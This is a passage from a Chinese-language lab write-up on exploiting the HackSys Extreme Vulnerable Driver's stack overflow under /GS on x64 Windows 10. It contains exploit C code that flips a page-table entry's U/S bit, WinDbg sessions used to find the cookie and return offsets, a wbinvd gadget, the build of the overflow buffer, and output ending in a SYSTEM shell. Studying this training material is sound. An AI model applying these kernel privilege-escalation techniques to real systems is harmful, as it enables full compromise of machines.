        PULONGLONG pte = (PULONGLONG)VirtualAlloc(NULL, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pte == 0) {
            printf("[!] FATAL: Error allocating memeory for pte\n");
            return FALSE;
        }
        ReadData(pte, (PULONGLONG)pteAddr, 8);
        ULONGLONG pteValue = *pte;
        printf("[+] Pte for shellcode is 0x%I64x\n", pteValue);
        BOOL status = WriteData(pteAddr, pteValue ^ 0x4);
        VirtualFree(pte, 0, MEM_RELEASE);
        return status;
    }
可以看到修改完 U/S 字段之后，PTE 中该字段标志变成了 K。
    1: kd> !process  0 0 StackOverflowGS.exe
    PROCESS ffff82018712a080
        SessionId: 1  Cid: 16f4    Peb: 5677005000  ParentCid: 1830
        DirBase: 6de97000  ObjectTable: ffffd20318965540  HandleCount:  46.
        Image: StackOverflowGS.exe
    1: kd> .process /p ffff82018712a080
    Implicit process is now ffff8201`8712a080
    .cache forcedecodeuser done
    1: kd> !pte 1c5733b0000
                                               VA 000001c5733b0000
    PXE at FFFFF77BBDDEE018    PPE at FFFFF77BBDC038A8    PDE at FFFFF77B80715CC8    PTE at     FFFFF700E2B99D80
    contains 0000000000000000
    contains 0000000000000000
    not valid
    1: kd> !pte FFFFF700E2B99D80 1
                                               VA fffff700e2b99d80
    PXE at FFFFF700E2B99D80    PPE at FFFFF700E2B99D80    PDE at FFFFF700E2B99D80    PTE at     FFFFF700E2B99D80
    contains 0100000071227843  contains 0100000071227843  contains 0100000071227843  contains   0100000071227843
    pfn 71227     ---D---KWEV  pfn 71227     ---D---KWEV  pfn 71227     ---D---KWEV  pfn 71227     ---D---KWEV
### 4.4.3 确定覆盖缓冲区大小
因为在漏洞函数中目的缓冲区的大小有 512 字节，为了避免溢出导致崩溃机器重启，先设置一个 0x100
的缓冲区，调试确定缓冲区起始地址和返回地址之间距离，以及 xored_security_cookie 存储的位置。
    3: kd> p
    HEVD!TriggerBufferOverflowStackGS+0x3e:
    fffff800`7468671e e8ddadf7ff      call    HEVD!memset (fffff800`74601500)
    3: kd> r 
    rax=ffffac48d2424401 rbx=0000000000000000 rcx=ffffed0993030560
    rdx=0000000000000000 rsi=0000000000000100 rdi=00000036192ff5c0
    rip=fffff8007468671e rsp=ffffed0993030540 rbp=ffff8806463fb1a0
     r8=0000000000000200  r9=000000000000004d r10=fffff80074685078
    r11=ffffed09930307c8 r12=0000000000000200 r13=0000000000000000
    r14=ffff8806463fb270 r15=ffff8806443d4a80
    iopl=0         nv up ei pl zr na po nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
    HEVD!TriggerBufferOverflowStackGS+0x3e:
    fffff800`7468671e e8ddadf7ff      call    HEVD!memset (fffff800`74601500)
这里确定缓冲区的起始地址是 `rcx=ffffed0993030560`，大小是 `r8=0000000000000200`。
    1: kd> p
    HEVD!TriggerBufferOverflowStackGS+0xf6:
    fffff800`746867d6 8bc3            mov     eax,ebx
    1: kd> p
    HEVD!TriggerBufferOverflowStackGS+0xf8:
    fffff800`746867d8 488b8c2420020000 mov     rcx,qword ptr [rsp+220h]
    1: kd> ? rsp + 220h
    Evaluate expression: -20849599772832 = ffffed09`93030760
这里确定 xored_security_cookie 保存在 `ffffed0993030760`。
    1: kd> p
    HEVD!TriggerBufferOverflowStackGS+0x11f:
    fffff800`746867ff c3              ret
    1: kd> r rsp
    rsp=ffffed0993030798
这里确定返回地址保存在 `ffffed0993030798`。
由以上结果，确定 xored_security_cookie 偏移为 0x200，返回地址偏移为 0x238。
### 4.4.4 TLB 缓存清理
其实在没有进行这一步之前，可能是因为我一直回退到干净版本镜像的原因，我的漏洞利用已经成功了，但是考虑到这个步骤在漏洞利用中比较通用，因此也学习一下，并把它加入到漏洞利用程序中。
TLB 缓存的问题很好解决，只需要通过 wbinvd 指令更新并禁用缓存。使用 RP++ 找到 gadget 地址：
    0x380640: wbinvd ; ret ; \x0f\x09\xc3 (1 found)
最后的缓冲区结构为：
    // Start to exploit
    char buffer[0x248] = { 0 };
    printf("[+] Preparing exploit buffer!\n");
    memset(buffer, 0x41, sizeof(buffer));
    // xored securty cookie
    memcpy(&buffer[COOKIE_OFFSET], &xored_cookie, 8);
    // return address
    memcpy(&buffer[RTN_OFFSET], &wbinvdAddr, 8);
    memcpy(&buffer[RTN_OFFSET+8], &shellcode, 8);
## 4.5 结果
    PS C:\Users\patch\Desktop> C:\Users\patch\Desktop\StackOverflowGS.exe
    [+] HEVD StackOverflowGS exploit
    [+] Obtaining Driver Base Address!
    [+] HEVD.sys is located at: 0xfffff80074600000
    [+] Locating function!
    [+] fileBase is 0xfffff80074600000
    [+] elfanew is 0xd8
    [+] numberOfSections is 0x7
    [+] sizeOfOptionalHeader is 0xf0
    [+] Found .text section, not .data, continue...
    [+] Found .rdat section, not .data, continue...
    [+] hevdDataSection is 0xfffff80074603000
    [+] New cookie value is 0x414141414141!
    [+] Found StackOverflowGS.exe
    [+] StackBase is 0xffffed0992b0a000, StackLimit is 0x ffffed0992b04000
    [+] Obtaining Driver Base Address!
    [+] ntoskrnl.exe is located at: 0xfffff80072207000
    [+] ntoskrnl.exe is 0x7ff7e9f80000
    [+] NtDeviceIoControlFile is 0x7ff7ea5955f0
    [+] Anchor is 0xfffff8007281c646
    [+] AnchorAddr is ffffed0992b09a18
    [+] RSP is ffffed0992b09540
    [+] Creating shellcode.
    [+] Shellcode allocated at: 0x0000023767260000
    [+] Getting pte for shellcode.
    [+] Obtaining Driver Base Address!
    [+] ntoskrnl.exe is located at: 0xfffff80072207000
    [+] Obtaining Driver Base Address!
    [+] ntoskrnl.exe is located at: 0xfffff80072207000
    [+] ntoskrnl.exe is 0x7ff7e9f80000
    [+] MmLockPreChargedPagedPool is 0x7ff7ea6eb1e0
    MiGetPteAddress from locatefun2 is fffff800724e4f10
    [+] Rerutn from LocateFunc!
    Reading data at fffff800724e4f23
    [+] The base address of PTE is 0xfffffc0000000000
    [+] Pte Address of shellcode is 0xfffffc011bb39300
    [+] Changing U/S of pte.
    [+] Pte for shellcode is 0x4006a867
    [+] Preparing exploit buffer!
    [+] Opening handle to \\.\HacksysExtremeVulnerableDriver
    C:\>whoami
    nt authority\system
# 5\. 知识点积累
1.64 位系统的 SEH 处理机制；
2./GS 绕过方法；
3.任意写漏洞也可以实现任意读；
4.确定`MiGetPteAddress` 函数地址的方法，以及：
  * 从 `EnumDeviceDrivers` 函数获取的驱动地址是内核基地址，不能直接在代码中读取其内容，需要利用任意读漏洞；使用 `LoadLibraryA` 得到的句柄值是将驱动加载到当前进程的内存空间中之后的基地址，可以直接在代码中读取其内容，但是此种方式得到的 PTE 基地址没用。
  * 获得代码段地址时，通过 `IMAGE_OPTIONAL_HEADER` 获取的代码段基址实际上是 .rdata 的基址，如果从这里按顺序读取数据会访问到不可访问的地址，应该从 .text 的 `IMAGE_SECTION_HEADER` 处读取偏移量和大小。
5.在 windbg 中使用 `!pte` 显示某个虚拟地址的 pte 地址之前，需要先转换到对应进程的上下文。
6.!pte 命令执行报错 `Levels not implemented for this platform`
这个没有找到好的解决办法，我尝试安装了低版本的 WDK，当时问题解决了，但是过几天再次尝试时又失败了。
7.cmp 和 test 汇编指令的区别（这个真的总是弄混）
8.TLB 缓存禁用的方法
# 6\. 参考资料
  1. [分析文章](https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html)
  2. [Four different tricks to bypass StackShield and StackGuard protection](https://www.cs.purdue.edu/homes/xyzhang/spring07/Papers/defeat-stackguard.pdf)
  3. [Exceptional Behavior - x64 Structured Exception Handling](\[https://www.osronline.com/article.cfm%5earticle=469.htm#:~:text=Because%20the%20x64,within%20the%20module\]\(https://www.osronline.com/article.cfm^article=469.htm#:~:text=Because the x64,within the module\))
  4. [Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)
  5. [Windows 10 Mitigation Improvements](https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf)
  6. [TAKING WINDOWS 10 KERNEL EXPLOITATION TO THE NEXT LEVEL](\[https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf\]\(https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level–Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf\))
  7. [X64 分页机制](https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g)
  8. [MValidateHandle 泄露内核地址](https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp)
* * *